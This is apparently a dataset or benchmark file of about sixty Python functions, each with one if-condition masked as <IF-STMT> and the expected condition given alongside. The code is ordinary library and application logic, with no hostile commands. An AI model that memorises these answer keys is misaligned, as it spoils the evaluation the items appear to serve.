699,"def _compute_early_outs(self, quotas):<tab>for q in quotas:<tab><tab>if q.closed and not self._ignore_closed:<tab><tab><tab>self.results[q] = Quota.AVAILABILITY_ORDERED, 0<tab><tab>elif q.size is None:<tab><tab><tab>self.results[q] = Quota.AVAILABILITY_OK, None<tab><tab><IF-STMT><tab><tab><tab>self.results[q] = Quota.AVAILABILITY_GONE, 0",elif q . size == 0 :,118
700,"def providers_for_config_string(config_string, netcode):<tab>providers = []<tab>for d in config_string.split():<tab><tab>p = provider_for_descriptor_and_netcode(d, netcode)<tab><tab><IF-STMT><tab><tab><tab>providers.append(p)<tab><tab>else:<tab><tab><tab>warnings.warn(""can't parse provider %s in config string"" % d)<tab>return providers",if p :,100
701,"def _get_plugin_value(self, feature, actor):<tab>for plugin in plugins.all(version=2):<tab><tab>handlers = safe_execute(plugin.get_feature_hooks, _with_transaction=False)<tab><tab>for handler in handlers or ():<tab><tab><tab>rv = handler(feature, actor)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return rv<tab>return None",if rv is not None :,94
702,"def test_digit_numeric_consistent(self):<tab># Test that digit and numeric are consistent,<tab># i.e. if a character has a digit value,<tab># its numeric value should be the same.<tab>count = 0<tab>for i in xrange(0x10000):<tab><tab>c = unichr(i)<tab><tab>dec = self.db.digit(c, -1)<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(dec, self.db.numeric(c))<tab><tab><tab>count += 1<tab>self.assertTrue(count >= 10)  # should have tested at least the ASCII digits",if dec != - 1 :,144
703,"def call(command, title, retry):<tab>""""""Run a command-line program and display the result.""""""<tab>if Options.rerun_args:<tab><tab>command, title, retry = Options.rerun_args<tab><tab>Options.rerun_args = None<tab><tab>success = call(command, title, retry)<tab><tab><IF-STMT><tab><tab><tab>return False<tab>print("""")<tab>print(""$ %s"" % "" "".join(command))<tab>failure = subprocess.call(command)<tab>if failure and retry:<tab><tab>Options.rerun_args = command, title, retry<tab>return not failure",if not success :,141
704,"def handle_custom_actions(self):<tab>for _, action in CustomAction.registry.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if action.action not in self.parser.choices:<tab><tab><tab>self.parser.add_parser(action.action, help="""")<tab><tab>action(self.page).add_arguments(self.parser, self)",if action . resource != self . resource :,92
705,"def __init__(self, user, *args, **kwargs):<tab>self.user = user<tab>super(AccountSettingsForm, self).__init__(*args, **kwargs)<tab>if self.user.is_managed:<tab><tab># username and password always managed, email and<tab><tab># name optionally managed<tab><tab>for field in (""email"", ""name"", ""username""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.fields[field] = ReadOnlyTextField(label=self.fields[field].label)<tab><tab># don't show password field at all<tab><tab>del self.fields[""new_password""]<tab># don't show username field if its the same as their email address<tab>if self.user.email == self.user.username:<tab><tab>del self.fields[""username""]","if field == ""username"" or field in settings . SENTRY_MANAGED_USER_FIELDS :",199
706,"def eval(self, code, eval=True, raw=False):<tab>self._engine._append_source(code)<tab>try:<tab><tab>result = self._context.eval(code)<tab>except quickjs.JSException as e:<tab><tab>raise ProgramError(*e.args)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>if raw or not isinstance(result, quickjs.Object):<tab><tab><tab><tab>return result<tab><tab><tab>elif callable(result) and self.typeof(result) == u""function"":<tab><tab><tab><tab>return self.Function(self, result)<tab><tab><tab>else:<tab><tab><tab><tab>return json.loads(result.json())",if eval :,158
707,"def get_def_offsets(self, defloc):<tab>""""""Get the byte offsets for a definition.""""""<tab>defn = self.defs[defloc.def_id]<tab>typ = defn.typ<tab>if typ == ""Attribute"":<tab><tab>start, end = self._get_attr_bounds(defn.name, defloc.location)<tab>else:<tab><tab>start = self.source.get_offset(defloc.location)<tab><tab><IF-STMT><tab><tab><tab>start += DEF_OFFSETS[typ]<tab><tab>end = start + len(defn.name)<tab>return (start, end)",if typ in DEF_OFFSETS :,147
708,"def RemoveRefCountOutput(data):<tab>while 1:<tab><tab>last_line_pos = data.rfind(""\n"")<tab><tab>if not re.match(""\[\d+ refs\]"", data[last_line_pos + 1 :]):<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab># All the output<tab><tab><tab>return """"<tab><tab>data = data[:last_line_pos]<tab>return data",if last_line_pos < 0 :,103
709,"def traverse_before_reduce(operator):<tab>""""""Internal traverse function""""""<tab>if isinstance(operator, tvm.te.PlaceholderOp):<tab><tab>return<tab>if tag.is_injective(operator.tag):<tab><tab>sch[operator].compute_inline()<tab><tab>for tensor in operator.input_tensors:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>traverse_before_reduce(tensor.op)<tab>else:<tab><tab>raise RuntimeError(""Unsupported operator: %s"" % operator.tag)<tab>scheduled_ops.append(operator)",if tensor . op not in scheduled_ops :,133
710,"def _get_config(key):<tab>config = db.session.execute(<tab><tab>Configs.__table__.select().where(Configs.key == key)<tab>).fetchone()<tab>if config and config.value:<tab><tab>value = config.value<tab><tab>if value and value.isdigit():<tab><tab><tab>return int(value)<tab><tab>elif value and isinstance(value, string_types):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab><tab>elif value.lower() == ""false"":<tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>return value<tab># Flask-Caching is unable to roundtrip a value of None.<tab># Return an exception so that we can still cache and avoid the db hit<tab>return KeyError","if value . lower ( ) == ""true"" :",181
711,"def find_executable(names):<tab># Given a list of executable names, find the first one that is available<tab># as an executable file, on the path.<tab>for name in names:<tab><tab>fpath, fname = os.path.split(name)<tab><tab>if fpath:<tab><tab><tab># The given name is absolute.<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return name<tab><tab>else:<tab><tab><tab># Try to find the name on the PATH<tab><tab><tab>for path in os.environ[""PATH""].split(os.pathsep):<tab><tab><tab><tab>exe_file = os.path.join(path, name)<tab><tab><tab><tab>if is_executable(exe_file):<tab><tab><tab><tab><tab>return exe_file<tab># Could not find it :(<tab>return None",if is_executable ( name ) :,186
712,"def push(self):<tab>advice = self.check()<tab>if not self._context[""silent""]:<tab><tab><IF-STMT><tab><tab><tab>print(""No changes to push."")<tab><tab><tab>return<tab><tab>choice = input(""Continue? y/N:"")<tab><tab>if choice != ""y"":<tab><tab><tab>print(""Aborted on user command"")<tab><tab><tab>return<tab>print(""push local changes to remote..."")<tab>self._publish.syncRemote(self._context[""srcroot""], advice)",if not self . hasPendingSync ( advice ) :,123
713,"def __init__(self, itemtype, cnf={}, *, master=None, **kw):<tab>if not master:<tab><tab><IF-STMT><tab><tab><tab>master = kw[""refwindow""]<tab><tab>elif ""refwindow"" in cnf:<tab><tab><tab>master = cnf[""refwindow""]<tab><tab>else:<tab><tab><tab>master = tkinter._default_root<tab><tab><tab>if not master:<tab><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab><tab>""Too early to create display style: "" ""no root window""<tab><tab><tab><tab>)<tab>self.tk = master.tk<tab>self.stylename = self.tk.call(""tixDisplayStyle"", itemtype, *self._options(cnf, kw))","if ""refwindow"" in kw :",167
714,"def __call__(self, x, **kwargs):<tab>h = x<tab>for layer, argnames, accept_var_args in zip(<tab><tab>self.layers, self.argnames, self.accept_var_args<tab>):<tab><tab><IF-STMT><tab><tab><tab>layer_kwargs = kwargs<tab><tab>else:<tab><tab><tab>layer_kwargs = {k: v for k, v in kwargs.items() if k in argnames}<tab><tab>h = layer(h, **layer_kwargs)<tab>return h",if accept_var_args :,121
715,def run_train_loop(self):<tab>self.begin_training()<tab>for _ in self.yield_train_step():<tab><tab>if self.should_save_model():<tab><tab><tab>self.save_model()<tab><tab><IF-STMT><tab><tab><tab>self.save_checkpoint()<tab><tab>if self.should_eval_model():<tab><tab><tab>self.eval_model()<tab><tab>if self.should_break_training():<tab><tab><tab>break<tab>self.eval_model()<tab>self.done_training()<tab>return self.returned_result(),if self . should_save_checkpoint ( ) :,139
716,"def configure_callback(conf):<tab>""""""Received configuration information""""""<tab>global ZK_HOSTS<tab>for node in conf.children:<tab><tab><IF-STMT><tab><tab><tab>ZK_HOSTS = node.values[0].split("","")<tab><tab>else:<tab><tab><tab>collectd.warning(""zookeeper plugin: Unknown config key: %s."" % node.key)<tab>log(""Configured with hosts=%s"" % (ZK_HOSTS))","if node . key == ""Hosts"" :",108
717,"def inner(self, *args, **kwargs):<tab>""""""Inner.""""""<tab>if not is_internet_available():<tab><tab>LOGGER.debug(""\n\n%s"", func.__name__)<tab><tab>LOGGER.debug(""============================"")<tab><tab><IF-STMT><tab><tab><tab>LOGGER.debug('"""""" %s """"""', func.__doc__.strip())<tab><tab>LOGGER.debug(""----------------------------"")<tab><tab>LOGGER.debug(""Skipping because no Internet connection available."")<tab><tab>LOGGER.debug(""\n++++++++++++++++++++++++++++"")<tab><tab>return None<tab>result = func(self, *args, **kwargs)<tab>return result",if func . __doc__ :,155
718,"def _shares_in_results(data):<tab>shares_in_device, shares_in_subdevice = False, False<tab>for plugin_name, plugin_result in data.iteritems():<tab><tab>if plugin_result[""status""] == ""error"":<tab><tab><tab>continue<tab><tab>if ""device"" not in plugin_result:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>shares_in_device = True<tab><tab>for subdevice in plugin_result[""device""].get(""subdevices"", []):<tab><tab><tab>if ""disk_shares"" in subdevice:<tab><tab><tab><tab>shares_in_subdevice = True<tab><tab><tab><tab>break<tab>return shares_in_device, shares_in_subdevice","if ""disk_shares"" in plugin_result [ ""device"" ] :",175
719,"def register_auth_provider_blueprints(cls, app, prefix=""/auth/login""):<tab>app.auth_providers = []<tab>for provider in app.config.get(""AUTH_PROVIDERS"", [""debug"", ""oauth""]):<tab><tab><IF-STMT><tab><tab><tab>provider = cls._get_subclass_for(provider.lower())(name=provider, app=app)<tab><tab>app.register_blueprint(<tab><tab><tab>provider.blueprint, url_prefix=""/"".join((prefix, provider.name))<tab><tab>)<tab><tab>app.auth_providers.append(provider)","if not isinstance ( provider , KnowledgeAuthProvider ) :",144
720,"def getText(self, stuff):<tab>if isinstance(stuff, Fighter):<tab><tab>active = [x.name for x in stuff.abilities if x.active]<tab><tab><IF-STMT><tab><tab><tab>return ""None""<tab><tab>return "", "".join(active)",if len ( active ) == 0 :,69
721,"def run(self, paths=[]):<tab>items = []<tab>for item in SideBarSelection(paths).getSelectedItems():<tab><tab>if item.isUnderCurrentProject():<tab><tab><tab>items.append(item.url(""url_production""))<tab>if len(items) > 0:<tab><tab>sublime.set_clipboard(""\n"".join(items))<tab><tab><IF-STMT><tab><tab><tab>sublime.status_message(""Items URL copied"")<tab><tab>else:<tab><tab><tab>sublime.status_message(""Item URL copied"")",if len ( items ) > 1 :,131
722,"def read_boolean(file: BinaryIO, count: int, checkall: bool = False) -> List[bool]:<tab>if checkall:<tab><tab>all_defined = file.read(1)<tab><tab>if all_defined != unhexlify(""00""):<tab><tab><tab>return [True] * count<tab>result = []<tab>b = 0<tab>mask = 0<tab>for i in range(count):<tab><tab><IF-STMT><tab><tab><tab>b = ord(file.read(1))<tab><tab><tab>mask = 0x80<tab><tab>result.append(b & mask != 0)<tab><tab>mask >>= 1<tab>return result",if mask == 0 :,146
723,"def __prep_write_total(self, comments, main, fallback, single):<tab>lower = self.as_lowercased()<tab>for k in [main, fallback, single]:<tab><tab>if k in comments:<tab><tab><tab>del comments[k]<tab>if single in lower:<tab><tab>parts = lower[single].split(""/"", 1)<tab><tab>if parts[0]:<tab><tab><tab>comments[single] = [parts[0]]<tab><tab>if len(parts) > 1:<tab><tab><tab>comments[main] = [parts[1]]<tab>if main in lower:<tab><tab>comments[main] = lower.list(main)<tab>if fallback in lower:<tab><tab><IF-STMT><tab><tab><tab>comments[fallback] = lower.list(fallback)<tab><tab>else:<tab><tab><tab>comments[main] = lower.list(fallback)",if main in comments :,196
724,"def _filter_medias_not_commented(self, media_items):<tab>not_commented_medias = []<tab>for media in media_items:<tab><tab>if media.get(""comment_count"", 0) > 0 and media.get(""comments""):<tab><tab><tab>my_comments = [<tab><tab><tab><tab>comment<tab><tab><tab><tab>for comment in media[""comments""]<tab><tab><tab><tab><IF-STMT><tab><tab><tab>]<tab><tab><tab>if my_comments:<tab><tab><tab><tab>continue<tab><tab>not_commented_medias.append(media)<tab>return not_commented_medias","if comment [ ""user_id"" ] == self . user_id",152
725,"def run(url):<tab>import os<tab>for fpath in [<tab><tab>os.path.expanduser(""~/Applications/zeal.app""),<tab><tab>""/Applications/zeal.app"",<tab>]:<tab><tab><IF-STMT><tab><tab><tab>import subprocess, pipes<tab><tab><tab>pid = subprocess.Popen(<tab><tab><tab><tab>[<tab><tab><tab><tab><tab>fpath + ""/Contents/MacOS/zeal"",<tab><tab><tab><tab><tab>""--query={0}"".format(pipes.quote(url)),<tab><tab><tab><tab>],<tab><tab><tab><tab>stdout=subprocess.PIPE,<tab><tab><tab><tab>stderr=subprocess.PIPE,<tab><tab><tab><tab>stdin=subprocess.PIPE,<tab><tab><tab>)<tab><tab><tab>return","if os . path . exists ( fpath + ""/Contents/MacOS/zeal"" ) :",176
726,"def get_input_info(exec_info, network):<tab>input_dict = collections.OrderedDict()<tab>for v in exec_info.data_variable:<tab><tab>input_dict[v.variable_name] = []<tab>for v in network.variable:<tab><tab><IF-STMT><tab><tab><tab>shape = v.shape.dim<tab><tab><tab>input_dict[v.name] = [x if x > 0 else batch_size for x in shape]<tab>return input_dict",if v . name in input_dict :,118
727,"def _clean_text(self, text):<tab>""""""Performs invalid character removal and whitespace cleanup on text.""""""<tab>output = []<tab>char_idx = []<tab>for i, char in enumerate(text):<tab><tab>cp = ord(char)<tab><tab>if cp == 0 or cp == 0xFFFD or _is_control(char):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>output.append("" "")<tab><tab><tab>char_idx.append(i)<tab><tab>else:<tab><tab><tab>output.append(char)<tab><tab><tab>char_idx.append(i)<tab>return """".join(output), char_idx",if _is_whitespace ( char ) :,151
728,"def AddVersion(version, ns, versionId="""", isLegacy=0, serviceNs=""""):<tab>if not ns:<tab><tab>ns = serviceNs<tab>if version not in parentMap:<tab><tab>nsMap[version] = ns<tab><tab>if len(versionId) > 0:<tab><tab><tab>versionMap[ns + ""/"" + versionId] = version<tab><tab><IF-STMT><tab><tab><tab>versionMap[ns] = version<tab><tab>versionIdMap[version] = versionId<tab><tab>if not serviceNs:<tab><tab><tab>serviceNs = ns<tab><tab>serviceNsMap[version] = serviceNs<tab><tab>parentMap[version] = set()","if isLegacy or ns is """" :",150
729,"def set_accessible_async(self, trans, id=None, accessible=False):<tab>""""""Set workflow's importable attribute and slug.""""""<tab>stored = self.get_stored_workflow(trans, id)<tab># Only set if importable value would change; this prevents a change in the update_time unless attribute really changed.<tab>importable = accessible in [""True"", ""true"", ""t"", ""T""]<tab>if stored and stored.importable != importable:<tab><tab><IF-STMT><tab><tab><tab>self._make_item_accessible(trans.sa_session, stored)<tab><tab>else:<tab><tab><tab>stored.importable = importable<tab><tab>trans.sa_session.flush()<tab>return",if importable :,158
730,"def update(self, val, n=1):<tab>if val is not None:<tab><tab>self.val = val<tab><tab><IF-STMT><tab><tab><tab>self.sum = type_as(self.sum, val) + (val * n)<tab><tab><tab>self.count = type_as(self.count, n) + n",if n > 0 :,80
731,"def run(self, root):<tab>footnotesDiv = self.footnotes.makeFootnotesDiv(root)<tab>if footnotesDiv is not None:<tab><tab>result = self.footnotes.findFootnotesPlaceholder(root)<tab><tab><IF-STMT><tab><tab><tab>child, parent, isText = result<tab><tab><tab>ind = list(parent).index(child)<tab><tab><tab>if isText:<tab><tab><tab><tab>parent.remove(child)<tab><tab><tab><tab>parent.insert(ind, footnotesDiv)<tab><tab><tab>else:<tab><tab><tab><tab>parent.insert(ind + 1, footnotesDiv)<tab><tab><tab><tab>child.tail = None<tab><tab>else:<tab><tab><tab>root.append(footnotesDiv)",if result :,175
732,def ehp(self):<tab>if self.__ehp is None:<tab><tab><IF-STMT><tab><tab><tab>ehp = self.hp<tab><tab>else:<tab><tab><tab>ehp = self.damagePattern.calculateEhp(self)<tab><tab>self.__ehp = ehp<tab>return self.__ehp,if self . damagePattern is None :,80
733,"def literal(self):<tab>if self.peek('""'):<tab><tab>lit, lang, dtype = self.eat(r_literal).groups()<tab><tab>if lang:<tab><tab><tab>lang = lang<tab><tab>else:<tab><tab><tab>lang = None<tab><tab><IF-STMT><tab><tab><tab>dtype = dtype<tab><tab>else:<tab><tab><tab>dtype = None<tab><tab>if lang and dtype:<tab><tab><tab>raise ParseError(""Can't have both a language and a datatype"")<tab><tab>lit = unquote(lit)<tab><tab>return Literal(lit, lang, dtype)<tab>return False",if dtype :,132
734,"def _purge(self, queue):<tab>""""""Remove all messages from `queue`.""""""<tab>count = 0<tab>queue_find = ""."" + queue + "".msg""<tab>folder = os.listdir(self.data_folder_in)<tab>while len(folder) > 0:<tab><tab>filename = folder.pop()<tab><tab>try:<tab><tab><tab># only purge messages for the requested queue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>filename = os.path.join(self.data_folder_in, filename)<tab><tab><tab>os.remove(filename)<tab><tab><tab>count += 1<tab><tab>except OSError:<tab><tab><tab># we simply ignore its existence, as it was probably<tab><tab><tab># processed by another worker<tab><tab><tab>pass<tab>return count",if filename . find ( queue_find ) < 0 :,189
735,"def check(data_dir, decrypter, read_only=False):<tab>fname = os.path.join(data_dir, DIGEST_NAME)<tab>if os.path.exists(fname):<tab><tab>if decrypter is None:<tab><tab><tab>return False<tab><tab>f = open(fname, ""rb"")<tab><tab>s = f.read()<tab><tab>f.close()<tab><tab>return decrypter.decrypt(s) == MAGIC_STRING<tab>else:<tab><tab><IF-STMT><tab><tab><tab>if read_only:<tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>s = decrypter.encrypt(MAGIC_STRING)<tab><tab><tab><tab>f = open(fname, ""wb"")<tab><tab><tab><tab>f.write(s)<tab><tab><tab><tab>f.close()<tab><tab>return True",if decrypter is not None :,198
736,"def on_train_epoch_end(self, trainer, pl_module, outputs):<tab>epoch = trainer.current_epoch<tab>if self.unfreeze_backbone_at_epoch <= epoch:<tab><tab>optimizer = trainer.optimizers[0]<tab><tab>current_lr = optimizer.param_groups[0][""lr""]<tab><tab>backbone_lr = self.previous_backbone_lr<tab><tab><IF-STMT><tab><tab><tab>assert backbone_lr <= current_lr<tab><tab>else:<tab><tab><tab>assert backbone_lr == current_lr",if epoch < 6 :,127
737,"def parse_rsync_url(location):<tab>""""""Parse a rsync-style URL.""""""<tab>if "":"" in location and ""@"" not in location:<tab><tab># SSH with no user@, zero or one leading slash.<tab><tab>(host, path) = location.split("":"", 1)<tab><tab>user = None<tab>elif "":"" in location:<tab><tab># SSH with user@host:foo.<tab><tab>user_host, path = location.split("":"", 1)<tab><tab><IF-STMT><tab><tab><tab>user, host = user_host.rsplit(""@"", 1)<tab><tab>else:<tab><tab><tab>user = None<tab><tab><tab>host = user_host<tab>else:<tab><tab>raise ValueError(""not a valid rsync-style URL"")<tab>return (user, host, path)","if ""@"" in user_host :",178
738,"def populate_settings_dict(form, settings):<tab>new_settings = {}<tab>for key, value in iteritems(settings):<tab><tab>try:<tab><tab><tab># check if the value has changed<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>new_settings[key] = form[key].data<tab><tab>except KeyError:<tab><tab><tab>pass<tab>return new_settings",if value == form [ key ] . data :,105
739,"def draw_boxes(image, boxes, scores=None, drop_score=0.5):<tab>if scores is None:<tab><tab>scores = [1] * len(boxes)<tab>for (box, score) in zip(boxes, scores):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>box = np.reshape(np.array(box), [-1, 1, 2]).astype(np.int64)<tab><tab>image = cv2.polylines(np.array(image), [box], True, (255, 0, 0), 2)<tab>return image",if score < drop_score :,136
740,"def update(self, instance, validated_data):<tab>for category, category_data in validated_data.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self.update_validated_settings(category_data)<tab><tab>for field_name, field_value in category_data.items():<tab><tab><tab>setattr(getattr(instance, category), field_name, field_value)<tab>return instance",if not category_data :,98
741,"def insert(self, menuName, position, label, command, underline=None):<tab>menu = self.getMenu(menuName)<tab>if menu:<tab><tab><IF-STMT><tab><tab><tab>menu.insert(position, ""command"", label=label, command=command)<tab><tab>else:<tab><tab><tab>menu.insert(<tab><tab><tab><tab>position, ""command"", label=label, command=command, underline=underline<tab><tab><tab>)",if underline is None :,104
742,"def delete_old_links():<tab>for doc in web.ctx.site.store.values(type=""account-link""):<tab><tab>expiry_date = datetime.strptime(doc[""expires_on""], ""%Y-%m-%dT%H:%M:%S.%f"")<tab><tab>now = datetime.utcnow()<tab><tab>key = doc[""_key""]<tab><tab><IF-STMT><tab><tab><tab>print(""Deleting link %s"" % (key))<tab><tab><tab>del web.ctx.site.store[key]<tab><tab>else:<tab><tab><tab>print(""Retaining link %s"" % (key))",if expiry_date > now :,141
743,"def _object(o: edgedb.Object):<tab>ret = {}<tab>for attr in dir(o):<tab><tab>try:<tab><tab><tab>link = o[attr]<tab><tab>except (KeyError, TypeError):<tab><tab><tab>link = None<tab><tab><IF-STMT><tab><tab><tab>ret[attr] = serialize(link)<tab><tab>else:<tab><tab><tab>ret[attr] = serialize(getattr(o, attr))<tab>return ret",if link :,102
744,"def __init__(self, items):<tab>self._format = string.join(map(lambda item: item[0], items), """")<tab>self._items = items<tab>self._buffer_ = win32wnet.NCBBuffer(struct.calcsize(self._format))<tab>for format, name in self._items:<tab><tab>if len(format) == 1:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>val = ""\0""<tab><tab><tab>else:<tab><tab><tab><tab>val = 0<tab><tab>else:<tab><tab><tab>l = int(format[:-1])<tab><tab><tab>val = ""\0"" * l<tab><tab>self.__dict__[name] = val","if format == ""c"" :",158
745,"def prepare_text(text, style):<tab>body = []<tab>for fragment, sty in parse_tags(text, style, subs.styles):<tab><tab>fragment = fragment.replace(r""\h"", "" "")<tab><tab>fragment = fragment.replace(r""\n"", ""\n"")<tab><tab>fragment = fragment.replace(r""\N"", ""\n"")<tab><tab><IF-STMT><tab><tab><tab>fragment = ""<i>%s</i>"" % fragment<tab><tab>if sty.underline:<tab><tab><tab>fragment = ""<u>%s</u>"" % fragment<tab><tab>if sty.strikeout:<tab><tab><tab>fragment = ""<s>%s</s>"" % fragment<tab><tab>body.append(fragment)<tab>return re.sub(""\n+"", ""\n"", """".join(body).strip())",if sty . italic :,180
746,"def get_from_target(target):<tab>domains = set()<tab>if isinstance(target, str):<tab><tab><IF-STMT><tab><tab><tab>logger.log(""FATAL"", ""Use targets parameter for multiple domain names"")<tab><tab><tab>exit(1)<tab><tab>domain = match_main_domain(target)<tab><tab>if not domain:<tab><tab><tab>return domains<tab><tab>domains.add(domain)<tab>return domains","if target . endswith ( "".txt"" ) :",101
747,"def iterate(self, prod_, rule_):<tab>newProduction = """"<tab>for i in range(len(prod_)):<tab><tab>step = self.production[i]<tab><tab><IF-STMT><tab><tab><tab>newProduction = newProduction + self.ruleW<tab><tab>elif step == ""X"":<tab><tab><tab>newProduction = newProduction + self.ruleX<tab><tab>elif step == ""Y"":<tab><tab><tab>newProduction = newProduction + self.ruleY<tab><tab>elif step == ""Z"":<tab><tab><tab>newProduction = newProduction + self.ruleZ<tab><tab>elif step != ""F"":<tab><tab><tab>newProduction = newProduction + step<tab>self.drawLength = self.drawLength * 0.5<tab>self.generations += 1<tab>return newProduction","if step == ""W"" :",179
748,"def cancel_pp(self, nzo_id):<tab>""""""Change the status, so that the PP is canceled""""""<tab>for nzo in self.history_queue:<tab><tab><IF-STMT><tab><tab><tab>nzo.abort_direct_unpacker()<tab><tab><tab>if nzo.pp_active:<tab><tab><tab><tab>nzo.pp_active = False<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab># Try to kill any external running process<tab><tab><tab><tab><tab>self.external_process.kill()<tab><tab><tab><tab><tab>logging.info(<tab><tab><tab><tab><tab><tab>""Killed external process %s"", self.external_process.args[0]<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>except:<tab><tab><tab><tab><tab>pass<tab><tab><tab>return True<tab>return None",if nzo . nzo_id == nzo_id :,196
749,"def list_backends(debug):<tab>for backend in sorted(<tab><tab>backends.getBackendList(), key=lambda backend: backend.identifier<tab>):<tab><tab><IF-STMT><tab><tab><tab>print(<tab><tab><tab><tab>""{:>15} : {} ({})"".format(<tab><tab><tab><tab><tab>backend.identifier, backend.__doc__, backend.__name__<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>print(""{:>15} : {}"".format(backend.identifier, backend.__doc__))",if debug :,116
750,"def _geo_indices(cls, inspected=None):<tab>inspected = inspected or []<tab>geo_indices = []<tab>inspected.append(cls)<tab>for field in cls._fields.values():<tab><tab><IF-STMT><tab><tab><tab>field_cls = field.document_type<tab><tab><tab>if field_cls in inspected:<tab><tab><tab><tab>continue<tab><tab><tab>if hasattr(field_cls, ""_geo_indices""):<tab><tab><tab><tab>geo_indices += field_cls._geo_indices(inspected)<tab><tab>elif field._geo_index:<tab><tab><tab>geo_indices.append(field)<tab>return geo_indices","if hasattr ( field , ""document_type"" ) :",155
751,"def run_test_family(tests, mode_filter, files, open_func, *make_args):<tab>for test_func in tests:<tab><tab>if test_func is None:<tab><tab><tab>out.write(""\n"")<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>for s in test_func.file_sizes:<tab><tab><tab>name, size = files[size_names[s]]<tab><tab><tab># name += file_ext<tab><tab><tab>args = tuple(f(name, size) for f in make_args)<tab><tab><tab>run_one_test(name, size, open_func, test_func, *args)",if mode_filter in test_func . file_open_mode :,168
752,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_application_key(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_message(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 26:<tab><tab><tab>self.set_tag(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 18 :,152
753,"def _on_config_changed(self, option: str) -> None:<tab>if option in [""zoom.levels"", ""zoom.default""]:<tab><tab><IF-STMT><tab><tab><tab>factor = float(config.val.zoom.default) / 100<tab><tab><tab>self.set_factor(factor)<tab><tab>self._init_neighborlist()",if not self . _default_zoom_changed :,86
754,"def keyPressEvent(self, event):<tab>""""""Add up and down arrow key events to built in functionality.""""""<tab>keyPressed = event.key()<tab>if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]:<tab><tab>if keyPressed == Constants.UP_KEY:<tab><tab><tab>self.index = max(0, self.index - 1)<tab><tab>elif keyPressed == Constants.DOWN_KEY:<tab><tab><tab>self.index = min(len(self.completerStrings) - 1, self.index + 1)<tab><tab>elif keyPressed == Constants.TAB_KEY and self.completerStrings:<tab><tab><tab>self.tabPressed()<tab><tab><IF-STMT><tab><tab><tab>self.setTextToCompleterIndex()<tab>super(CueLineEdit, self).keyPressEvent(event)",if self . completerStrings :,192
755,"def maxRange(self):<tab>attrs = (<tab><tab>""shieldTransferRange"",<tab><tab>""powerTransferRange"",<tab><tab>""energyDestabilizationRange"",<tab><tab>""empFieldRange"",<tab><tab>""ecmBurstRange"",<tab><tab>""maxRange"",<tab>)<tab>for attr in attrs:<tab><tab>maxRange = self.getModifiedItemAttr(attr, None)<tab><tab>if maxRange is not None:<tab><tab><tab>return maxRange<tab>if self.charge is not None:<tab><tab>delay = self.getModifiedChargeAttr(""explosionDelay"", None)<tab><tab>speed = self.getModifiedChargeAttr(""maxVelocity"", None)<tab><tab><IF-STMT><tab><tab><tab>return delay / 1000.0 * speed",if delay is not None and speed is not None :,186
756,"def decref(self, *keys):<tab>for tileable_key, tileable_id in keys:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>_graph_key, ids = self._executed_tileables[tileable_key]<tab><tab>if tileable_id in ids:<tab><tab><tab>ids.remove(tileable_id)<tab><tab><tab># for those same key tileables, do decref only when all those tileables are garbage collected<tab><tab><tab>if len(ids) != 0:<tab><tab><tab><tab>continue<tab><tab><tab>self.delete_data(tileable_key)",if tileable_key not in self . _executed_tileables :,137
757,"def run(self):<tab># Make some objects emit lights<tab>for obj in bpy.context.scene.objects:<tab><tab>if ""modelId"" in obj:<tab><tab><tab>obj_id = obj[""modelId""]<tab><tab><tab># In the case of the lamp<tab><tab><tab>if obj_id in self.lights:<tab><tab><tab><tab>self._make_lamp_emissive(obj, self.lights[obj_id])<tab><tab><tab># Make the windows emit light<tab><tab><tab>if obj_id in self.windows:<tab><tab><tab><tab>self._make_window_emissive(obj)<tab><tab><tab># Also make ceilings slightly emit light<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._make_ceiling_emissive(obj)","if obj . name . startswith ( ""Ceiling#"" ) :",190
758,"def _create_bucket(self):<tab>""""""Create remote S3 bucket if it doesn't exist""""""<tab>resource = boto3.resource(""s3"")<tab>try:<tab><tab>resource.meta.client.head_bucket(Bucket=self.bucket)<tab>except ClientError as e:<tab><tab>error_code = int(e.response[""Error""][""Code""])<tab><tab><IF-STMT><tab><tab><tab>resource.create_bucket(Bucket=self.bucket)<tab><tab>else:<tab><tab><tab>raise",if error_code == 404 :,118
